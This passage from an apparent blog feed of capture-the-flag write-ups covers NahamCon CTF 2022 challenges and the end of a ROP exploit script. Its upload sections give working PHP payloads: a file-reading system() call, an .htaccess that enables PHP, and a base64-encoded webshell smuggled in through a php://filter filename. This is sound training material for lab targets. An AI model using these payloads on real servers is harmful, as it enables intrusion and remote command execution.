</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040053e</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png" alt="2023-01-13-201337_1023x371_scrot"></p>
<p>Et on a le flag, gg!</p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 NahamCon CTF 2022 (writeups)</title>
            <link>/posts/2022/12/nahamcon-ctf-2022-writeups/</link>
            <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
            
            <guid>/posts/2022/12/nahamcon-ctf-2022-writeups/</guid>
            <description>Technical Support Author: @JohnHammond#6971 Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server! Go on the discord, in the #nahamcon-ctf-general channel, and we can see this in the channel description
flag → flag{a98373a74abb8c5ebb8f5192e034a91c}</description>
            <content type="html"><![CDATA[<h1 id="technical-support">Technical Support</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server!
</code></pre><p>Go on the discord, in the <a href="https://discord.com/channels/598608711186907146/1053097744241283142">#nahamcon-ctf-general</a> channel, and we can see this in the channel description</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png" alt="2022-12-17-172256_1335x78_scrot"></p>
<p>flag → <strong>flag{a98373a74abb8c5ebb8f5192e034a91c}</strong></p>
<h1 id="babys-first-heartbleed">Baby’s First Heartbleed</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!
</code></pre><p>Start the machine, and connect to it using nc</p>
<p><code>⌨️ nc challenge.nahamcon.com 31985</code></p>
<p>really guessed this one — when he asks for a string just type anything (like “<strong><strong><strong><strong><strong><strong><strong>hello”</strong></strong></strong></strong></strong></strong></strong> for example) and when he asks for a length, type a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>high number</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>You should see the flag appear in the server response:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268344-dc135f5b-8bca-43bb-b899-5c3ae30df6bc.png" alt="2022-12-17-172914_1888x1032_scrot"></p>
<p>flag → <strong>flag{bfca3d71260e581ba366dca054f5c8e5}</strong></p>
<h1 id="read-the-rules">Read The Rules</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Please follow the rules for this CTF!
</code></pre><p>Go to the <a href="https://ctf.nahamcon.com/rules">rules pages</a> and open up DevTools (or go to view-source) and you should find a comment with the flag at the very bottom of the page’s html</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268349-17827a40-0c4c-4502-bb87-ec932abbcd50.png" alt="2022-12-17-173352_943x617_scrot"></p>
<p>flag → <strong>flag{90bc54705794a62015369fd8e86e557b}</strong></p>
<h1 id="hashstation">Hashstation</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Below is a SHA256 hash! Can you determine what the original data was, before it was hashes?

705db0603fd5431451dab1171b964b4bd575e2230f40f4c300d70df6e65f5f1c
</code></pre><p>You could probably do it with hashcat, but i’m lazy so i’ll just use <a href="http://crackstation.net">crackstation.net</a></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268371-e7fa0ef8-00f3-410f-8696-4396f4945dcf.png" alt="2022-12-17-190623_1056x434_scrot"></p>
<p>flag → <strong><strong><strong><strong><strong>flag{awesome}</strong></strong></strong></strong></strong></p>
<h1 id="catscii">Catscii</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Do you know what the cat command does in the Linux command-line?
</code></pre><p>Download the file and cat its content</p>
<p><code>⌨️ cat catscii</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268377-98773958-b8a1-4888-8996-1ad12557f7d5.png" alt="2022-12-17-190848_1888x1032_scrot"></p>
<p>flag → <strong>flag{258da40ab06be7c99099d603a3b3ccb1}</strong></p>
<h1 id="banjo">Banjo</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Oooh, that classic twang! The banjo is one of my favorite strings instruments!
</code></pre><p>Download the image, and use the <strong><strong><strong><strong><strong><strong><strong>strings</strong></strong></strong></strong></strong></strong></strong> command on it, then <strong><strong><strong><strong>grep flag</strong></strong></strong></strong></p>
<p><code>⌨️ strings banjo.jpg | grep flag</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268383-2e539cec-5632-4a7d-8594-9a741322edb6.png" alt="2022-12-17-191103_1888x1032_scrot"></p>
<p>flag → <strong>flag{ce4e687e575392ae242f0e41c888de11}</strong></p>
<h1 id="arjeebee">Arjeebee</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

What is the rgb(19,55,175) color in its hexadecimal representation?
</code></pre><p>Go to <a href="https://www.rgbtohex.net/">rgbtohex.net</a> and enter the RGB values</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268387-601be543-3b43-404f-8a2f-8d755ac02d58.png" alt="2022-12-17-191342_762x467_scrot"></p>
<p>flag → flag{#1337AF}</p>
<h1 id="way-2-basic">Way 2 Basic</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Here is some data represented in base 2. What is this data represented as ASCII text?

01100110 01101100 01100001 01100111 01111011 00111001 00110000 01100011 00110110 01100101 01100010 01100101 00111001 00110100 00110001 00110101 00110110 00110001 01100011 01100110 01100001 01100100 01100110 01100001 01100101 00110001 00110111 00110000 01100001 00111000 01100110 00110000 01100101 01100001 00110010 00110101 00110010 01111101
</code></pre><p>Go to <a href="https://www.rapidtables.com/convert/number/binary-to-ascii.html">any binary to text website</a> (base 2 and binary are the same thing)</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268400-4c9af57c-7224-425b-a37e-d734dc4b89fc.png" alt="2022-12-17-191609_646x566_scrot"></p>
<p>flag → <strong>flag{90c6ebe941561cfadfae170a8f0ea252}</strong></p>
<h1 id="byepass">Byepass</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Help yourself Say Goodbye to days gone by with our easy online service! Upload your photos to capture the memory, cherish them with friends and family, and savor the time we have together!

Retrieve the flag out of the root of the filesystem /flag.txt.
</code></pre><p>Since we have the website’s source code, we can see that there is an upload form at <strong><strong>/save_memories.php</strong></strong></p>
<p>We can also see which file extentions are blacklisted</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ext_denylist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php2&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php3&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php4&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php5&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php6&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php7&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pht&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtm&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtml&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pgif&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;shtml&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phar&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;inc&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;hphp&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ctp&#34;</span>,
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>The danger when using blacklists is forgetting something, and that’s what happened here: the <strong><strong><strong><strong><strong><strong>.php16</strong></strong></strong></strong></strong></strong> extention is not filtered</p>
<p>The challenge’s description tells us that the flag is located in the root of the filesystem, so we can directly try to <strong><strong><strong>cat</strong></strong></strong> it using php</p>
<p>First, let’s create a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> file, with our malicious code inside</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat ../../../../../flag.txt&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Upload it, and read it by going to <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268408-9edb7538-8a43-4293-9b0c-158781ecb8e7.png" alt="2022-12-17-203048_930x1026_scrot"></p>
<p>aaaaaand… it’s blank</p>
<p>This can happen for two reasons:</p>
<ul>
<li>It did not manage to <strong><strong><strong>cat</strong></strong></strong> the file</li>
<li>PHP engine is not enabled</li>
</ul>
<p>Assuming <strong><strong><strong><strong><strong><strong><strong><strong>flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> exists, it is because the php engine is not enabled</p>
<p>By looking at the request, we know it’s running Apache, so we can try to upload a <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong> file that will enable <strong><strong><strong>php</strong></strong></strong></p>
<p>.htaccess:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">AddType</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">php16</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php_flag</span> <span style="color:#a6e22e">engine</span> <span style="color:#a6e22e">on</span>
</span></span></code></pre></div><p>Upload dit, and read it by going to <strong><strong><strong>/.htaccess</strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268411-9a442e5e-2855-4e30-b312-2c42a7dbbedd.png" alt="2022-12-17-203816_929x261_scrot"></p>
<p>We get a 403 Forbidden response, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>which is a good sign</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, because by default, Apache prevents users from reading files such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>Now, let’s re-upload our <strong><strong><strong><strong><strong>php16</strong></strong></strong></strong></strong> file</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268416-303e5c36-bb7d-4646-b814-83652f92294f.png" alt="2022-12-17-204028_834x171_scrot"></p>
<p>The PHP is now executed and not read</p>
<p>flag -&gt; <strong>flag{32697ad7acd2d4718758d9a5ee42965d}</strong></p>
<h1 id="use-after-exit">Use After Exit</h1>
<pre tabindex="0"><code>Author: @carlopolop#3938

It&#39;s as easy as it looks, isn&#39;t it?
</code></pre><p>When we visit the website, we can see the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e"> </span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;submit&#39;</span>]))<span style="color:#a6e22e"> </span>{
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    </span>$file_name <span style="color:#f92672">=</span><span style="color:#a6e22e"> urldecode</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    </span>$tmp_path <span style="color:#f92672">=</span><span style="color:#a6e22e"> </span>$_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    if</span>(<span style="color:#a6e22e">strpos</span>($file_name,<span style="color:#a6e22e"> </span><span style="color:#e6db74">&#34;.jpg&#34;</span>)<span style="color:#a6e22e"> </span><span style="color:#f92672">==</span><span style="color:#a6e22e"> false</span>){
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">        echo </span><span style="color:#e6db74">&#34;Invalid file name&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">        exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    </span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    </span>$content <span style="color:#f92672">=</span><span style="color:#a6e22e"> file_get_contents</span>($tmp_path);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    </span>$all_content <span style="color:#f92672">=</span><span style="color:#a6e22e"> </span><span style="color:#e6db74">&#39;&lt;?php exit(0);&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e"> </span>$content <span style="color:#f92672">.</span><span style="color:#a6e22e"> </span><span style="color:#e6db74">&#39;?&gt;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    </span>$handle <span style="color:#f92672">=</span><span style="color:#a6e22e"> fopen</span>($file_name,<span style="color:#a6e22e"> </span><span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    fwrite</span>($handle,<span style="color:#a6e22e"> </span>$all_content);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    fclose</span>($handle);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    echo </span><span style="color:#e6db74">&#34;Done.&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>So we are going to have 2 things to bypass:</p>
<ul>
<li>File needs to have .jpg in its name</li>
<li><code>&lt;?php exit(0); ?&gt;</code> will be written at the beginning of the file</li>
</ul>
<p>The first condition is very easy to bypass, since <strong><strong><strong><strong><strong><strong>strpos</strong></strong></strong></strong></strong></strong> checks if “.jpg” is <strong><strong><strong><strong><strong><strong><strong><strong>anywhere</strong></strong></strong></strong></strong></strong></strong></strong> in the file name, not at the end, so we can upload <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.jpg.php</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>The second condition is more annoying, but by reading the <a href="https://www.php.net/manual/en/function.fopen.php">fopen manual</a>, and the <a href="https://www.php.net/manual/en/wrappers.php">supported wrappers page</a>, we understand that we can use <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>php wrappers</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>filter://</strong></strong></strong></strong></strong></strong></strong></strong></strong> inside of the fopen function</p>
<p>This is useful because if we look at the top of the script, the name of the file is passed through the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>urldecode()</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> function</p>
<p>That will allow us to have special characters such as / in our file name</p>
<p>To prevent the <strong><strong><strong><strong><strong><strong><strong>exit(0)</strong></strong></strong></strong></strong></strong></strong> from bothering us, we will be using the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>php://filter/convert.base64-decode</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> wrapper, because if we try to decode <strong><!-- raw HTML omitted --></strong> from base64, it gives us this: <strong>^+t</strong>, which is exactly what we want</p>
<p>Let’s base64 encode a php “webshell”:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span>
</span></span></code></pre></div><p>and paste this into a file that we’ll call</p>
<p><code>⌨️ php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Dshell.jpg.php</code></p>
<p>that way, when it will be passed through the <strong><strong><strong><strong><strong><strong><strong><strong><strong>urldecode</strong></strong></strong></strong></strong></strong></strong></strong></strong>() function, the filename will look like this</p>
<p><code>⌨️ php://filter/convert.base64-decode/resource=shell.jpg.php</code></p>
<p>He will then decode and write this to shell.jpg.php:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>which will look like this atfer decoding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">^+</span><span style="color:#a6e22e">t</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Now that we’ve got our webshell, we can get the flag from user’s home by navigating to <strong><strong><strong><strong>/shell.jpg.php?cmd=cat ../../../../home/user/flag.txt</strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268427-34eaece6-b4cb-4711-bfa4-a0c8a6f4a540.png" alt="2022-12-17-202338_930x1026_scrot"></p>
<p>flag → <strong><strong><strong><strong><strong><strong>flag{ab5f69d6cc412345387a0ca3a4700398}</strong></strong></strong></strong></strong></strong></p>
<h1 id="padlock">Padlock</h1>
<pre tabindex="0"><code>Author: @birch#9901

I forgot the combination to my pad lock :(
</code></pre><p>First step is to run the binary, and see how it acts</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268431-b33f5b14-4617-4e3d-9fa1-e91d9cf42ad3.png" alt="2022-12-17-230325_551x808_scrot"></p>
<p>It asks for a passcode, then probably compares it with the right passcode</p>
<p>We’ll throw it into IDA, and press <strong><strong>F5</strong></strong> to generate a pseudocode</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">51LL</span>, <span style="color:#ae81ff">101LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">95LL</span>, <span style="color:#ae81ff">32LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">48LL</span>, <span style="color:#ae81ff">111LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">52LL</span>, <span style="color:#ae81ff">97LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">101LL</span>, <span style="color:#ae81ff">51LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">32LL</span>, <span style="color:#ae81ff">95LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">111LL</span>, <span style="color:#ae81ff">48LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">97LL</span>, <span style="color:#ae81ff">52LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that it takes our input, then replaces some values and compares it with the string <strong>&ldquo;master locks arent vry strong are they&rdquo;</strong></p>
<p>These values in the <strong><strong><strong><strong><strong><strong>replace()</strong></strong></strong></strong></strong></strong> function are annoying so we are going to select them and press <strong><strong><strong><strong><strong><strong><strong><strong><strong>R</strong></strong></strong></strong></strong></strong></strong></strong></strong> (which will give us their Char value)</p>
<p>The pseudocode now looks like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
</span></span><span style="display:flex;"><span>  {
